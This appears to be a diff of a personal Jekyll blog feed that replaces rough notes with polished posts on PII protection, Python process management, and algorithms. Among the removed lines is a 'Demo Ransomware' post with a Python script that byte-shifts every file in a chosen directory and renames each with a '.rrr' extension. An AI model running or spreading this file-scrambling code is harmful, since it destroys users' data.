+  <li>Digital identifiers (usernames, passwords, IP addresses)</li>
+</ul>
 
-<p>** Whatsapp profile DP – medical emergency …</p>
+<h2 id="common-threats-to-your-digital-identity">Common Threats to Your Digital Identity</h2>
 
-<p>6th June</p>
+<h3 id="1-phishing-attacks">1. Phishing Attacks</h3>
+<p>Phishing remains one of the most prevalent cybersecurity threats. Attackers often use:</p>
+<ul>
+  <li>Spam phishing: Mass emails targeting large groups</li>
+  <li>Spear phishing: Personalized attacks targeting specific individuals</li>
+</ul>
 
-<p>– Fetching data from Dark Web – crawler</p>
+<p><strong>Red Flags to Watch For:</strong></p>
+<ul>
+  <li>Urgent requests for personal information</li>
+  <li>Threats about account closure</li>
+  <li>Suspicious links or attachments</li>
+  <li>Poor grammar or spelling</li>
+  <li>Requests to “verify” account details</li>
+</ul>
 
-<p>1st day – SMS
-2nd day email</p>
+<h3 id="2-malware-threats">2. Malware Threats</h3>
+<p>Various types of malicious software can compromise your PII:</p>
+<ul>
+  <li>Spyware: Secretly monitors your activities</li>
+  <li>Keyloggers: Records your keystrokes</li>
+  <li>Ransomware: Encrypts your files and demands payment</li>
+  <li>Trojans: Disguised as legitimate programs</li>
+</ul>
 
-<p>CDR
-SDR
-TDR</p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[20-June]]></summary></entry><entry><title type="html">Digital Protection: Protect you PLL</title><link href="http://localhost:4000/Cybersecurity-essentials/" rel="alternate" type="text/html" title="Digital Protection: Protect you PLL" /><published>2024-05-27T00:00:00+05:30</published><updated>2024-05-27T00:00:00+05:30</updated><id>http://localhost:4000/Cybersecurity-essentials</id><content type="html" xml:base="http://localhost:4000/Cybersecurity-essentials/"><![CDATA[<h1 id="cybersecurity-essentials">Cybersecurity Essentials</h1>
+<h2 id="essential-strategies-for-protecting-your-pii">Essential Strategies for Protecting Your PII</h2>
 
-<p>Cyberspace : A space of interconnected devices where all the devices on the internet are connected with each other through the internet where they can communicate and access information and conduct various online activities</p>
+<h3 id="1-practice-smart-information-sharing">1. Practice Smart Information Sharing</h3>
+<ul>
+  <li>Minimize sharing personal details on social media</li>
+  <li>Review privacy settings regularly</li>
+  <li>Be cautious about sharing work-related information</li>
+  <li>Avoid posting about your location in real-time</li>
+</ul>
 
-<p>phishing is the most used cyberattack</p>
+<h3 id="2-strengthen-your-digital-security">2. Strengthen Your Digital Security</h3>
+<ul>
+  <li>Use strong, unique passwords for each account</li>
+  <li>Implement two-factor authentication</li>
+  <li>Invest in a reliable password manager</li>
+  <li>Keep software and systems updated</li>
+  <li>Use reputable antivirus software</li>
+</ul>
 
-<p>ALways want to make a hykers group of people, got an opportunity in college but my team was full of idiots who knows nothing in this field and neither they are interested to learn and work on this, cybersecurity is like continued process which is not like done once and is completed</p>
+<h3 id="3-follow-the-stop-confirm-act-principle">3. Follow the “STOP, CONFIRM, ACT” Principle</h3>
+<p>Before sharing any personal information online:</p>
+<ul>
+  <li>STOP: Pause before responding to requests</li>
+  <li>CONFIRM: Verify the legitimacy of the request</li>
+  <li>ACT: Proceed only when you’re certain it’s safe</li>
+</ul>
 
-<p>Hacker : == a person or group using technical skills to gain unauthorized access to computer systems, networks or other technlogy based resourcses.</p>
+<h3 id="4-regular-digital-housekeeping">4. Regular Digital Housekeeping</h3>
+<ul>
+  <li>Delete unused accounts</li>
+  <li>Clear browsing history and cookies regularly</li>
+  <li>Remove unnecessary apps and software</li>
+  <li>Encrypt sensitive files and devices</li>
+  <li>Regularly backup important data</li>
+</ul>
 
-<h2 id="thrill-seeker-hackers">thrill seeker hackers</h2>
-<h2 id="malicious-hackers">malicious hackers</h2>
-<h2 id="improve-security-and-reduce-threats-hackers-">improve security and reduce threats hackers ..</h2>
+<h2 id="best-practices-for-social-media">Best Practices for Social Media</h2>
 
-<h1 id="malwareee-malicious-software">malwareee (Malicious Software)</h1>
+<ol>
+  <li><strong>Audit Your Profiles</strong>
+    <ul>
+      <li>Review and adjust privacy settings</li>
+      <li>Remove unnecessary personal information</li>
+      <li>Control who can see your posts</li>
+    </ul>
+  </li>
+  <li><strong>Be Selective About Connections</strong>
+    <ul>
+      <li>Accept friend requests only from known contacts</li>
+      <li>Be wary of duplicate accounts</li>
+      <li>Regularly review your connection list</li>
+    </ul>
+  </li>
+  <li><strong>Think Before You Post</strong>
+    <ul>
+      <li>Avoid sharing location data</li>
+      <li>Don’t post identification documents</li>
+      <li>Be careful with birthday information</li>
+      <li>Consider the long-term implications of your posts</li>
+    </ul>
+  </li>
+</ol>
 
-<p>Malwares can be developed in many forms, including viruses, worms, Trojan Horses, ransomware, spyware and adware.</p>
+<h2 id="when-pii-is-compromised">When PII is Compromised</h2>
 
-<p>Protecting computer systems and devices from malware is essential</p>
+<p>If you suspect your PII has been compromised:</p>
+<ol>
+  <li>Change passwords immediately</li>
+  <li>Contact relevant financial institutions</li>
+  <li>Monitor your credit reports</li>
+  <li>Report the incident to appropriate authorities</li>
+  <li>Consider freezing your credit</li>
+</ol>
 
-<h3 id="keepinf-software-up-to-date-br">keepinf software-up-to-date &lt;/br&gt;</h3>
-<h3 id="using-antivirus-software-br">using antivirus software &lt;/br&gt;</h3>
-<h3 id="practicing-safe-browsing-habits-br">practicing safe browsing habits &lt;/br&gt;</h3>
+<h2 id="conclusion">Conclusion</h2>
 
-<h2 id="caution--donwloading-or-opening-email-attachments">Caution : Donwloading or opening email attachments</h2>
+<p>Protecting your PII is an ongoing process that requires vigilance and awareness. While it might seem overwhelming, implementing these security measures gradually will help create a robust defense against digital threats. Remember: in the digital age, your personal information is one of your most valuable assets. Protect it accordingly.</p>
 
-<p>worms : independent malware program that reproduce itself to infect other computers, spread to other computers without attaching to an existing program and can damage network.</p>
-<h4 id="using-antivirus-softwares-and-intrudion-detection-systems-can-prevent-worms-to-infect">using antivirus softwares and intrudion detection systems can prevent worms to infect</h4>
+<hr />
 
-<p>virus : attached with another program and replicate itself infecting the files and folders on the computer</p>
+<p><em>Remember: If you don’t need it, delete it. Once information is online, it can potentially be there forever, and might end up in places you never intended, like the Dark Web.</em></p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[Protecting Your Digital Identity: A Comprehensive Guide]]></summary></entry><entry><title type="html">Understanding Process ID Management in Python</title><link href="http://localhost:4000/python/programming/Process-Management-Python/" rel="alternate" type="text/html" title="Understanding Process ID Management in Python" /><published>2024-03-26T00:00:00+05:30</published><updated>2024-03-26T00:00:00+05:30</updated><id>http://localhost:4000/python/programming/Process-Management-Python</id><content type="html" xml:base="http://localhost:4000/python/programming/Process-Management-Python/"><![CDATA[<p>Process management is a crucial aspect of system programming and administration. Python provides powerful tools for working with processes through its standard library and third-party packages. In this guide, we’ll explore how to effectively manage processes in Python.</p>
 
-<p>spyware : obtain information about the organization or individual without their knowledge or consent..</p>
+<h2 id="basic-process-operations-with-os-module">Basic Process Operations with <code class="language-plaintext highlighter-rouge">os</code> Module</h2>
 
-<p>Trojan Horse : tojan horse is somewhat same as virus malware which disguises itself as a legitimate program or file. it operates by hiding itself</p>
+<p>The <code class="language-plaintext highlighter-rouge">os</code> module provides fundamental process-related operations:</p>
 
-<p>Ransomware : A type of malware which encrypts a victims fiels. It can locks out of your machine at home or work</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
 
-<p>Adware : A malware which shows unwanted adds to the user without their consen.</p>
+<span class="c1"># Get the current process ID
+</span><span class="n">current_pid</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">getpid</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Current Process ID: </span><span class="si">{</span><span class="n">current_pid</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-<h3 id="spam-phishing--to-a-group-of-peoples-br">Spam phishing : to a group of peoples &lt;/br&gt;</h3>
-
-<h3 id="spear-phishing--on-an-individual">spear phishing : on an individual</h3>
-
-<p>Watch out for words and phrases such as:</p>
-
-<p>We suspect unauthorized use or transactions on your account.
-We will lock or close your account if you do not immediately confirm your identity.
-Click the link to verify your account is not compromised.</p>
-
-<p>A simple approach to increase cybersecurity is to STOP, CONFIRM, ACT.</p>
-
-<p>Most cyberattacks focus on humans’ innate desire to help and support one another.</p>
-
-<h2 id="password-protect-a-usb-drive-with-the-master-password-file">Password protect a USB drive with the master password file</h2>
-
-<h2 id="invest-in-a-password-manager-service">Invest in a password manager service</h2>
-
-<p>mistake many people do: Prioritizing convenience over security.</p>
-
-<h1 id="if-you-dontt-need-it-delete-it-">if you dont’t need it delete it ..</h1>
-
-<h1 id="information-is-sold-on-dark-web-">information is sold on Dark Web …</h1>
-
-<p>The first step in Cybersecurity Awareness is to protect your PII.</p>
-
-<p>to protect yourself online is to protect yourself from personal identifiable information (PLL)</p>
-
-<p>examples of pll: &lt;/br&gt;</p>
-
-<p>Standard disclosures we share should not include the following:</p>
-
-<p>Date of birth &lt;/br&gt;
-Date of birth is usually pre-set to yes on social media platforms. &lt;/br&gt;
-City of birth &lt;/br&gt;
-The birth city is usually pre-set to yes on social media platforms. &lt;/br&gt;
-Maiden name(s) &lt;/br&gt;
-Are you friends with family members who disclose their maiden names online? This is usually a password standard for online accounts. &lt;/br&gt;
-Current address, city, or both &lt;/br&gt;
-Have you invited people to any activities at your home that includes specific details about where you live? &lt;/br&gt;
-Phone number or email address &lt;/br&gt;
-Social Security, passport, or driver’s license numbers &lt;/br&gt;
-Bank, loan, or credit card information &lt;/br&gt;
-School, family, or work information &lt;/br&gt;
-Car information &lt;/br&gt;</p>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[Cybersecurity Essentials]]></summary></entry><entry><title type="html">Demo PID change code in Python</title><link href="http://localhost:4000/Demo-Ransomware-Code-in-Python/" rel="alternate" type="text/html" title="Demo PID change code in Python" /><published>2024-03-26T00:00:00+05:30</published><updated>2024-03-26T00:00:00+05:30</updated><id>http://localhost:4000/Demo-Ransomware-Code-in-Python</id><content type="html" xml:base="http://localhost:4000/Demo-Ransomware-Code-in-Python/"><![CDATA[<h3 id="demo-ransomware-code-in-python">Demo Ransomware code in Python</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import subprocess
-
-def change_wallpaper_to_black():
-    # Command to change wallpaper using gsettings
-    command = "gsettings set org.gnome.desktop.background primary-color '#000000'"
-    
-    try:
-        # Execute the command
-        subprocess.run(command, shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        print("Error:", e)
-
-if __name__ == "__main__":
-    change_wallpaper_to_black()
+<span class="c1"># Get the parent process ID
+</span><span class="n">parent_pid</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">getppid</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Parent Process ID: </span><span class="si">{</span><span class="n">parent_pid</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
+<h2 id="working-with-processes-using-psutil">Working with Processes using <code class="language-plaintext highlighter-rouge">psutil</code></h2>
 
-def encrypt_file(file_path):
-    # Open the file in read mode
-    with open(file_path, 'rb') as f:
-        data = f.read()
+<p>The <code class="language-plaintext highlighter-rouge">psutil</code> (Python System and Process Utilities) library offers more advanced process management capabilities:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">psutil</span>
+
+<span class="k">def</span> <span class="nf">get_process_info</span><span class="p">():</span>
+    <span class="c1"># Get current process
+</span>    <span class="n">current_process</span> <span class="o">=</span> <span class="n">psutil</span><span class="p">.</span><span class="nc">Process</span><span class="p">()</span>
     
-    # Define the encryption key (for demonstration purposes)
-    encryption_key = 5
-    
-    # Encrypt the data by shifting ASCII values
-    encrypted_data = bytes([(byte + encryption_key) % 256 for byte in data])
-    
-    # Write the encrypted data back to the file
-    with open(file_path, 'wb') as f:
-        f.write(encrypted_data)
-    
-    # Change the file extension to .rrr
-    os.rename(file_path, file_path + ".rrr")
-    
-    # Print the encrypted file path
-    print(f"Encrypted: {file_path}.rrr")
+    <span class="c1"># Get process details
+</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Process ID: </span><span class="si">{</span><span class="n">current_process</span><span class="p">.</span><span class="n">pid</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Process Name: </span><span class="si">{</span><span class="n">current_process</span><span class="p">.</span><span class="nf">name</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">CPU Usage: </span><span class="si">{</span><span class="n">current_process</span><span class="p">.</span><span class="nf">cpu_percent</span><span class="p">()</span><span class="si">}</span><span class="s">%</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Memory Usage: </span><span class="si">{</span><span class="n">current_process</span><span class="p">.</span><span class="nf">memory_info</span><span class="p">().</span><span class="n">rss</span> <span class="o">/</span> <span class="mi">1024</span> <span class="o">/</span> <span class="mi">1024</span><span class="si">:</span><span class="p">.</span><span class="mi">2</span><span class="n">f</span><span class="si">}</span><span class="s"> MB</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Status: </span><span class="si">{</span><span class="n">current_process</span><span class="p">.</span><span class="nf">status</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-def encrypt_directory(directory):
-    # Iterate over all files in the directory
-    for root, dirs, files in os.walk(directory):
-        for file in files:
-            file_path = os.path.join(root, file)
-            encrypt_file(file_path)
+<span class="c1"># List all running processes
+</span><span class="k">def</span> <span class="nf">list_all_processes</span><span class="p">():</span>
+    <span class="k">for</span> <span class="n">proc</span> <span class="ow">in</span> <span class="n">psutil</span><span class="p">.</span><span class="nf">process_iter</span><span class="p">([</span><span class="sh">'</span><span class="s">pid</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">cpu_percent</span><span class="sh">'</span><span class="p">]):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">PID: </span><span class="si">{</span><span class="n">proc</span><span class="p">.</span><span class="n">info</span><span class="p">[</span><span class="sh">'</span><span class="s">pid</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s">, Name: </span><span class="si">{</span><span class="n">proc</span><span class="p">.</span><span class="n">info</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s">, </span><span class="sh">"</span>
+                  <span class="sa">f</span><span class="sh">"</span><span class="s">CPU: </span><span class="si">{</span><span class="n">proc</span><span class="p">.</span><span class="n">info</span><span class="p">[</span><span class="sh">'</span><span class="s">cpu_percent</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s">%</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">except </span><span class="p">(</span><span class="n">psutil</span><span class="p">.</span><span class="n">NoSuchProcess</span><span class="p">,</span> <span class="n">psutil</span><span class="p">.</span><span class="n">AccessDenied</span><span class="p">):</span>
+            <span class="k">pass</span>
+</code></pre></div></div>
 
-if __name__ == "__main__":
-    directory_path = input("Enter the directory path to encrypt files: ")
-    encrypt_directory(directory_path)
-    print("Encryption and extension change complete!")
-    
-</code></pre></div></div>]]></content><author><name>Prashant Dangi</name></author><summary type="html"><![CDATA[Demo Ransomware code in Python]]></summary></entry><entry><title type="html">Algorithms And Computer Network</title><link href="http://localhost:4000/Algorithms-and-computer-network/" rel="alternate" type="text/html" title="Algorithms And Computer Network" /><published>2024-03-13T00:00:00+05:30</published><updated>2024-03-13T00:00:00+05:30</updated><id>http://localhost:4000/Algorithms-and-computer-network</id><content type="html" xml:base="http://localhost:4000/Algorithms-and-computer-network/"><![CDATA[<blockquote>
-  <p>Recursion</p>
-  <blockquote>
-    <p>Recursion Tree Method &lt;/br&gt;
-Master Method</p>
-  </blockquote>
-</blockquote>
+<h2 id="creating-and-managing-subprocesses">Creating and Managing Subprocesses</h2>
 
-<blockquote>
-  <p>Divide and Conquer</p>
-  <blockquote>
-    <p>Multiplying large integers Problem &lt;/br&gt;
-Kartasuba Algorithm &lt;/br&gt;
-Binary Search &lt;/br&gt;
-Median of Two Sorted Arrays &lt;/br&gt;</p>
-  </blockquote>
-</blockquote>
+<p>The <code class="language-plaintext highlighter-rouge">subprocess</code> module allows you to spawn new processes and interact with them:</p>
 
-<blockquote>
-  <p>Sorting</p>
-  <blockquote>
-    <p>Merge Sort &lt;/br&gt;
-Quick Sort &lt;/br&gt;
-Bucket Sort &lt;/br&gt;
-Radix Sort &lt;/br&gt;</p>
-  </blockquote>
-</blockquote>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
 
-<blockquote>
-  <p>Greedy Algorithm</p>
-  <blockquote>
-    <p>Knapsack Problem &lt;/br&gt;
-Activity Selection Problem &lt;/br&gt;
-Huffman Coding &lt;/br&gt;
-Finding Minimum Spanning Tree (Not Comming) &lt;/br&gt;</p>
-  </blockquote>
-</blockquote>
+<span class="k">def</span> <span class="nf">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># Run a command and capture output
+</span>        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span>
+            <span class="n">command</span><span class="p">,</span>
+            <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+            <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+            <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+            <span class="n">check</span><span class="o">=</span><span class="bp">True</span>
+        <span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Command output:</span><span class="sh">"</span><span class="p">,</span> <span class="n">result</span><span class="p">.</span><span class="n">stdout</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error running command:</span><span class="sh">"</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
 
-<blockquote>
-  <p>Strassen Matrix Multiplication</p>
-</blockquote>
+<span class="c1"># Example usage
+</span><span class="nf">run_command</span><span class="p">(</span><span class="sh">"</span><span class="s">ls -l</span><span class="sh">"</span><span class="p">)</span>  <span class="c1"># Unix/Linux
+# run_command("dir")  # Windows
+</span></code></pre></div></div>
+
+<h2 id="process-monitoring-and-resource-management">Process Monitoring and Resource Management</h2>
+
+<p>Here’s a practical example of monitoring process resources:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">psutil</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="k">def</span> <span class="nf">monitor_process</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">duration</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">Monitor a process for specified duration in seconds.</span><span class="sh">"""</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">process</span> <span class="o">=</span> <span class="n">psutil</span><span class="p">.</span><span class="nc">Process</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
+        <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+        
+        <span class="k">while</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span> <span class="o">&lt;</span> <span class="n">duration</span><span class="p">:</span>
+            <span class="c1"># Get process metrics
+</span>            <span class="n">cpu_percent</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="nf">cpu_percent</span><span class="p">()</span>
+            <span class="n">memory_percent</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="nf">memory_percent</span><span class="p">()</span>
+            
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">PID </span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s"> - CPU: </span><span class="si">{</span><span class="n">cpu_percent</span><span class="si">}</span><span class="s">%, </span><span class="sh">"</span>
+                  <span class="sa">f</span><span class="sh">"</span><span class="s">Memory: </span><span class="si">{</span><span class="n">memory_percent</span><span class="si">:</span><span class="p">.</span><span class="mi">2</span><span class="n">f</span><span class="si">}</span><span class="s">%</span><span class="sh">"</span><span class="p">)</span>
+            
+            <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            
+    <span class="k">except</span> <span class="n">psutil</span><span class="p">.</span><span class="n">NoSuchProcess</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Process with PID </span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s"> not found</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">psutil</span><span class="p">.</span><span class="n">AccessDenied</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Access denied to process with PID </span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Example usage
+# monitor_process(1234, duration=5)  # Monitor process 1234 for 5 seconds
+</span></code></pre></div></div>
+
+<h2 id="best-practices-and-safety-considerations">Best Practices and Safety Considerations</h2>
+
+<p>When working with process management in Python, keep these important points in mind:</p>
+
+<ol>
+  <li><strong>Permission Handling</strong>: Always check for appropriate permissions before accessing process information.</li>
+  <li><strong>Error Handling</strong>: Implement proper error handling for cases where processes may not exist or access is denied.</li>
+  <li><strong>Resource Management</strong>: Be cautious when terminating processes; ensure proper cleanup.</li>
+  <li><strong>Security</strong>: Never execute untrusted commands through subprocess.</li>
+  <li><strong>Cross-Platform Compatibility</strong>: Consider OS-specific differences when writing process management code.</li>
+</ol>
+
+<h2 id="practical-applications">Practical Applications</h2>
+
+<p>Process management in Python has many legitimate uses:</p>
+
+<ul>
+  <li>System monitoring tools</li>
+  <li>Resource usage tracking</li>
+  <li>Service management</li>
+  <li>Task automation</li>
+  <li>Performance optimization</li>
+  <li>Development tools and debugging</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Python’s process management capabilities make it an excellent choice for system administration and monitoring tasks. Whether you’re building a system monitor, managing services, or automating tasks, understanding process management is crucial for creating robust and efficient applications.</p>
+
+<p>Remember to always use these tools responsibly and consider security implications when working with system processes.</p>
+
+<hr />
+
+<p><em>Note: Some code examples may require installing additional packages:</em></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install </span>psutil
+</code></pre></div></div>
+
+<p>This guide covers the basics of process management in Python. For more advanced usage, refer to the official documentation of the respective modules and libraries.</p>]]></content><author><name>Prashant Dangi</name></author><category term="Python" /><category term="Programming" /><summary type="html"><![CDATA[Process management is a crucial aspect of system programming and administration. Python provides powerful tools for working with processes through its standard library and third-party packages. In this guide, we’ll explore how to effectively manage processes in Python.]]></summary></entry><entry><title type="html">Algorithms and Computer Networks</title><link href="http://localhost:4000/computers/programming/Algorithms-and-computer-network/" rel="alternate" type="text/html" title="Algorithms and Computer Networks" /><published>2024-03-13T00:00:00+05:30</published><updated>2024-03-13T00:00:00+05:30</updated><id>http://localhost:4000/computers/programming/Algorithms-and-computer-network</id><content type="html" xml:base="http://localhost:4000/computers/programming/Algorithms-and-computer-network/"><![CDATA[<h1 id="fundamental-algorithms">Fundamental Algorithms</h1>
+
+<h2 id="recursion">Recursion</h2>
+<p>Recursion is a problem-solving approach where a function calls itself to solve smaller instances of a problem. There are two primary methods to analyze recursive algorithms:</p>
+
+<h3 id="recursion-tree-method">Recursion Tree Method</h3>
+<p>The recursion tree method provides a visual representation of recursive calls, making it easier to:</p>
+<ul>
+  <li>Analyze time complexity</li>
+  <li>Understand the flow of recursive calls</li>
+  <li>Calculate space complexity</li>
+</ul>
+
+<h3 id="master-method">Master Method</h3>
+<p>A mathematical approach to analyze divide-and-conquer algorithms with recurrence relations of the form:
+T(n) = aT(n/b) + f(n)</p>
+
+<h2 id="divide-and-conquer">Divide and Conquer</h2>
+<p>A problem-solving paradigm that breaks down complex problems into smaller, manageable subproblems.</p>
+
+<h3 id="key-applications">Key Applications:</h3>
+<ol>
+  <li><strong>Multiplying Large Integers</strong>
+    <ul>
+      <li>Breaking down large numbers into smaller chunks</li>
+      <li>Efficient multiplication of multi-digit numbers</li>
+    </ul>
+  </li>
+  <li><strong>Karatsuba Algorithm</strong>
+    <ul>
+      <li>Fast multiplication algorithm</li>
+      <li>Reduces time complexity from O(n²) to O(n^log₂3)</li>
+    </ul>
+  </li>
+  <li><strong>Binary Search</strong>
+    <ul>
+      <li>Efficient searching in sorted arrays</li>
+      <li>Time complexity: O(log n)</li>
+    </ul>
+  </li>
+  <li><strong>Median of Two Sorted Arrays</strong>
+    <ul>
+      <li>Finding the median of combined sorted arrays</li>
+      <li>Optimal solution achieves O(log(min(m,n)))</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="sorting-algorithms">Sorting Algorithms</h2>
+
+<h3 id="merge-sort">Merge Sort</h3>
+<ul>
+  <li>Divide and conquer approach</li>
+  <li>Stable sorting algorithm</li>
+  <li>Time complexity: O(n log n)</li>
+</ul>
+
+<h3 id="quick-sort">Quick Sort</h3>
+<ul>
+  <li>Partition-based sorting</li>
+  <li>Average case: O(n log n)</li>
+  <li>Widely used in practice</li>
+</ul>
+
+<h3 id="bucket-sort">Bucket Sort</h3>
+<ul>
+  <li>Distribution-based sorting</li>
+  <li>Ideal for uniformly distributed data</li>
+  <li>Average case: O(n + k)</li>
+</ul>
+
+<h3 id="radix-sort">Radix Sort</h3>
+<ul>
+  <li>Non-comparative integer sorting</li>
+  <li>Sorts digits position by position</li>
+  <li>Time complexity: O(d * (n + k))</li>
+</ul>
+
+<h2 id="greedy-algorithms">Greedy Algorithms</h2>
+<p>Making locally optimal choices at each step to find a global optimum.</p>
+
+<h3 id="notable-problems">Notable Problems:</h3>
+<ol>
+  <li><strong>Knapsack Problem</strong>
+    <ul>
+      <li>Maximizing value while respecting weight constraints</li>
+      <li>Fractional vs 0/1 knapsack</li>
+    </ul>
+  </li>
+  <li><strong>Activity Selection</strong>
+    <ul>
+      <li>Scheduling maximum activities</li>
+      <li>Optimal substructure property</li>
+    </ul>
+  </li>
+  <li><strong>Huffman Coding</strong>
+    <ul>
+      <li>Data compression technique</li>
+      <li>Variable-length prefix coding</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="strassen-matrix-multiplication">Strassen Matrix Multiplication</h2>
+<ul>
+  <li>Efficient matrix multiplication algorithm</li>
+  <li>Reduces complexity from O(n³) to O(n^2.807)</li>
+  <li>Practical for very large matrices</li>
+</ul>
 
 <h1 id="computer-networks">Computer Networks</h1>
 
-<p>Why CN ?
- File/ Application Sharing
- Hardware Sharing
- Client-Server model
- Voice over IP (VoIP)
- Storage</p>
+<h2 id="why-study-computer-networks">Why Study Computer Networks?</h2>
 
-<p>A set of devices(or nodes) connected by media link is called Network.
- A node can be a device which can send or recieve data generated by other nodes on the network like printer etc :</p>
+<p>Networks have become fundamental to modern computing, enabling:</p>
+<ul>
+  <li>File and application sharing</li>
+  <li>Hardware resource sharing</li>
+  <li>Client-server applications</li>
+  <li>Voice over IP (VoIP)</li>
+  <li>Distributed storage systems</li>
+</ul>
 
-<p>is client server model differnet from this internode communication
- The links connecting the devices are called communicating channels &lt;/br&gt;</p>
+<h3 id="network-fundamentals">Network Fundamentals</h3>
+<p>A network is an interconnected collection of devices (nodes) that can:</p>
+<ul>
+  <li>Send and receive data</li>
+  <li>Share resources</li>
+  <li>Communicate through defined protocols</li>
+</ul>
 
-<blockquote>
-  <p>Transmission mode</p>
-  <blockquote>
-    <p>Simplex &lt;/br&gt;
-Half Duplex &lt;/br&gt;
-Full Duplex &lt;/br&gt;</p>
-  </blockquote>
-</blockquote>
+<h3 id="communication-channels">Communication Channels</h3>
+<p>The physical or logical connections between nodes that facilitate data transfer.</p>
 
-<h3 id="transmission-media">Transmission media</h3>
-<blockquote>
-  <p>Guided Media</p>
-  <blockquote>
-    <p>Coaxial &lt;/br&gt;</p>
-    <blockquote>
-      <p>Baseband &lt;/br&gt;
-Broadband &lt;/br&gt;</p>
-    </blockquote>
-  </blockquote>
-</blockquote>
+<h2 id="transmission-modes">Transmission Modes</h2>
 
-<p>fibre Optics</p>
-<blockquote>
-  <blockquote>
-    <p>Twisted &lt;/br&gt;</p>
-    <blockquote>
-      <p>Unshielded &lt;/br&gt;
-Shielded</p>
-    </blockquote>
-  </blockquote>
